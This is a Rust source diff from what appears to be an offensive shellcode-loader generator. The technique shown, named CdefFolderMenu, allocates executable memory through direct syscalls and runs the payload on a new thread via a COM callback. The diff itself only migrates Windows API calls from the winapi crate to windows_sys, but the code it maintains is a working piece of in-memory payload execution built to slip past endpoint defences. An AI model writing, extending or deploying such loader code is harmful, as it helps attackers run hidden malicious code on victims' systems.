@@ -9,7 +9,7 @@ impl Technique for CdefFolderMenu {
         ctx.set_template("callbackExec");
 
         let helpers = r#"
-unsafe extern "system" fn cdef_invoke(param: *mut winapi::ctypes::c_void) -> u32 {
+unsafe extern "system" fn cdef_invoke(param: *mut core::ffi::c_void) -> u32 {
     unsafe {
         // CoInitializeEx is process-global per-thread. Capture the HRESULT
         // so we only pair with CoUninitialize when *we* did the initialization.
@@ -54,17 +54,17 @@ unsafe extern "system" fn cdef_invoke(param: *mut winapi::ctypes::c_void) -> u32
         let body = r#"
         let addr = syscall_alloc_exec(&vec);
         if addr.is_null() { return; }
-        let thread = winapi::um::processthreadsapi::CreateThread(
-            null_mut(),
+        let thread = windows_sys::Win32::System::Threading::CreateThread(
+            std::ptr::null(),
             0,
             Some(cdef_invoke),
             addr,
             0,
-            null_mut(),
+            std::ptr::null_mut(),
         );
         if !thread.is_null() {
-            winapi::um::synchapi::WaitForSingleObject(thread, 0xFFFFFFFF);
-            winapi::um::handleapi::CloseHandle(thread);
+            windows_sys::Win32::System::Threading::WaitForSingleObject(thread, 0xFFFFFFFF);
+            windows_sys::Win32::Foundation::CloseHandle(thread);
         }
 "#;
         ctx.set_replacement("{{CALLBACK_INVOKE}}", body.to_string());
